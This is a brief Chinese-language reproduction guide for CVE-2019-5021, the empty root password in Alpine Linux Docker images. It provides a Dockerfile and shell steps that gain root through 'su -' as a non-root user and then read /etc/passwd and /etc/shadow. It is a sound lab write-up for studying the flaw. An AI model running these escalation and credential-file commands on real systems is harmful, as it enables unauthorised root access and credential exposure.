# CVE-2019-5021 alpine docker镜像漏洞

## 1.漏洞介绍

自 Alpine Linux 3.3 版本开始的所有 Docker 镜像中，root 用户包含一个空密码，这可能会导致攻击者获得 root 权限，进而造成攻击。

**受影响范围是 Alpine Linux Docker 镜像 3.3、3.4、3.5、3.6、3.7、3.8、3.9、edge 等全部版本。**

由于 Alpine Linux 镜像体积较小，所以在构建 Docker 镜像时，很多人都会推荐使用 Alpine Linux 作为基础镜像；包括很多 Docker 官方镜像也基本上都提供了基于 Alpine Linux 的镜像，甚至像 Docker 镜像等，是只提供了使用 Alpine Linux 作为基础镜像的版本。

## 2.复现步骤

```bash
mkdir cve-2019-0521
vi Dockerfile
```

Dockerfile内容为：

```bash
FROM alpine:3.5
RUN apk add --no-cache shadow
RUN adduser -S non_root
USER non_root
```

构建镜像：

```bash
docker build -t local/alpine:cve .
```

![image-20211125104218111](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125104218111.png)

进入容器：

```bash
docker run --rm -it  local/alpine:cve
```

然后执行：

```basic
id
whoami
su -
whoami
grep root /etc/passwd /etc/shadow
```

![image-20211125104310413](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125104310413.png)

可以看到成功使用普通用户获取的 `root` 权限。